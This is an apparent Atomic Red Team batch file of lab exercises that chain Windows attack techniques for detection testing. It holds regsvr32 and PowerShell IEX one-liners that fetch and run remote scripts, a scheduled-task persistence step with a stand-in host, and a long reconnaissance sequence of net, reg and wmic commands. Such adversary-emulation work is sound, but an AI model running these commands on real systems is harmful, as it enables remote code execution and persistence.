:: Basic Test Lab One
:: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/RegSvr32.sct
::

regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/RegSvr32.sct scrobj.dll

:: NOTE it is a BAD idea to execute scripts from a repo that you do not control.
:: NOTE We recommend executing from a server that you control.
:: NOTE Thank You :)


:: Lab Two
:: Chain Reactions - Chaining Multiple ATOMIC Test
:: Lets have some fun shall we ;-)
:: Techniques rarely occur in isolation
:: In the Attack Lets combine 3 Techniques
:: You can customize tests

:: Step 1. A payload executes Regsvr32.exe as seen in Lab One T1117

regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/RegSvr32.sct scrobj.dll

:: Step 2. This payload will execute an discovery sequence T1087
::    https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/Discovery.bat
::	  Alternate Endings ;-) => powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/Discovery.bat'); Discovery.bat"

net user Administrator /domain & net Accounts & net localgroup administrators & net use & net share & net group "domain admins" /domain & net config workstation & net accounts & net accounts /domain & net view & reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" & reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce & reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce & reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices & reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices & reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify & reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit & reg query HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell & reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell & reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad & reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce & reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx & reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run & reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run & reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce & reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run & reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run & wmic useraccount list & wmic useraccount get /ALL & wmic startup list brief & wmic share list & wmic service get name,displayname,pathname,startmode & wmic process list brief & wmic process get caption,executablepath,commandline & wmic qfe get description,installedOn /format:csv & arp -a & "cmd.exe" /C whoami & ipconfig /displaydns & route print & netsh advfirewall show allprofiles & systeminfo & qwinsta & quser

:: Step 3. We will setup some persistence by creating a scheduled task. T1053
::    Alternate Ending : SCHTASKS /Create /SC ONCE /TN spawn /TR "regsvr32.exe /s /u /i:https://example.com/a.sct scrobj.dll" /ST 20:10

SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10

::    We will also just go ahead and clean up the task.

SCHTASKS /Delete /TN Spawn /F
